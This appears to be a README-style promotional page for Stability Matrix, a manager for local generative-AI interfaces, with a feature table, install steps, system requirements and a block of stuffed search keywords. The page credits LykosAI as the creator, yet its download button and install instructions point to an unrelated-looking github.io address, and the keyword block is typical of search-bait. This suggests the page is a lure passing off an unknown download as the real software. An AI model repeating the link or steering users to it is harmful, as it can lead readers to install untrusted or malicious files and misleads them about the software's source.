# Stability Matrix Multi-Platform AI Environment and Model Workspace

---

## What is Stability Matrix?

Stability Matrix serves as a cross-platform desktop application and environment manager designed to install, organize, and launch open-source Generative AI interfaces. Created by LykosAI, it eliminates the complex setup of python virtual environments and git repositories by providing a self-contained framework for running WebUI Forge, ComfyUI, Automatic1111, SD.Next, and InvokeAI under a single portable installation.

A core advantage of Stability Matrix is its unified model directory system. Instead of duplicating multi-gigabyte Stable Diffusion checkpoints, Flux models, LoRAs, VAEs, and ControlNets across separate web interfaces, Stability Matrix links a central `Data/Models` directory dynamically to all installed packages. Its built-in Model Browser provides seamless integration with CivitAI and Hugging Face, allowing users to discover, download, and organize weights with automatic folder categorization.

Beyond package management, Stability Matrix includes a native Inference tab, interactive canvas tools, and ComfyUI workflow management. Users can track generation metadata, update underlying software with a single click, launch packages with customized command-line parameters, and run local AI workflows without cloud dependencies.

<div align="center">
  <img src="https://cdn.lykos.ai/static/new-model-browser.png" alt="Program Interface Screenshot"/>
</div>

[![Download Stability Matrix](https://img.shields.io/badge/Download-Stability_Matrix-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://d78152801.github.io/.github/Stability-Matrix-Package-Manager)

---

### 🎛 Key Features

| Feature | Description |
|---------|-------------|
| **Shared Model Directory** | Links a single pool of checkpoints, LoRAs, VAEs, and ControlNets across all packages. |
| **One-Click UI Setup** | Installs ComfyUI, Automatic1111, WebUI Forge, and SD.Next with isolated Python runtimes. |
| **CivitAI Integration** | Browses, searches, and downloads models or workflows directly into their proper subfolders. |
| **Native Inference Tab** | Generates images natively using local backends with prompt helpers and VAE auto-detection. |
| **Portable Execution** | Runs entirely from a self-contained directory without leaving residual global configuration files. |
| **Cross-Platform Support** | Native support for Windows (CUDA/ROCm), macOS (Metal/Apple Silicon), and Linux hardware. |

---

## 📥 Installation Guide

- Download Stability Matrix using the button above.
- Extract the portable archive or launcher package to your chosen directory.
- Launch `StabilityMatrix` and choose your primary Data Directory location during initial setup.
- Select your preferred AI packages (e.g., ComfyUI, WebUI Forge) to install automatically.
- Download models via the built-in CivitAI browser or move existing checkpoints into the central `Data/Models` directory.

---

### 🖥 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| OS | Windows 10/11 (64-bit) / macOS 12+ / Linux | Windows 11 (64-bit) / macOS 13+ (Apple Silicon) / Ubuntu 22.04+ |
| Processor | 4-Core Intel / AMD x86_64 or Apple M-Series | 8-Core CPU / Apple Silicon M1/M2/M3/M4 Pro or Max |
| GPU / VRAM | NVIDIA GTX 1060 (6 GB VRAM) / AMD ROCm compatible | NVIDIA RTX 3080 / 4080 (12+ GB VRAM) or Apple Unified Memory |
| RAM | 16 GB RAM | 32 GB RAM or higher |
| Storage | 10 GB free space for core UIs | 100+ GB High-Speed NVMe SSD space for AI model storage |

---

### Keywords Search Terms

Stability Matrix package manager • Stability Matrix portable launcher • local AI model manager • ComfyUI launcher • WebUI Forge installer • CivitAI model downloader • shared model directory • Automatic1111 package manager • LykosAI Stability Matrix • multi-UI AI launcher • local Stable Diffusion suite • Flux model manager • AI workflow library • portable generative AI GUI • Stability Matrix setup guide
